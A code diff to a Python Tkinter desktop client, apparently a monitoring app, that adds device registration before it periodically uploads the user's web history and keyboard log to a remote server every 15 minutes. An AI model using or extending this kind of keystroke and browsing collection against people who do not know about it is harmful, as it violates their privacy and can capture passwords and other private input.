@@ -16,6 +16,7 @@ HOST = "https://hanamthai.alwaysdata.net"
 win2=Frame(root, width=925,height=500,bg="white") # define to support when click button logout
 
 accessToken = ""
+isRegisterDevice = True
 
 def loginWindow(win2):
     def apiLogin(Win1):
@@ -54,11 +55,12 @@ def loginWindow(win2):
     #     global accessToken
     #     messagebox.showinfo('token', accessToken)
 
-    global img, accessToken
+    global img, accessToken, isRegisterDevice
     label = Label(root,image=img,bg='white').place(x=50,y=50)
     # when click logout then destroy homepage and clear token
     win2.destroy()
     accessToken = ""
+    isRegisterDevice = True
 
     win1=Frame(root, width=350,height=350,bg="white")
     win1.place(x=480,y=70) 
@@ -136,6 +138,16 @@ def homeWindow(win1,fullName):
         schedule_api_call()
 
 def schedule_api_call():
+    if accessToken == '':
+        return ''
+    global isRegisterDevice
+    if isRegisterDevice:
+        checkRegisterDevice = callApi.isRegisterDevice(accessToken)
+        if checkRegisterDevice == False:
+            print("Device is not registered!")
+            callApi.apiAddDevice(accessToken)
+        print("Device has registered!")
+        isRegisterDevice = False
     callApi.apiSendWebHistory(accessToken)
     callApi.apiSendKeyboardLog(accessToken)
     # Đặt lịch trình cho việc gọi lại hàm sau 15 phút (900,000 milliseconds) (1000 milliseconds = 1 second)
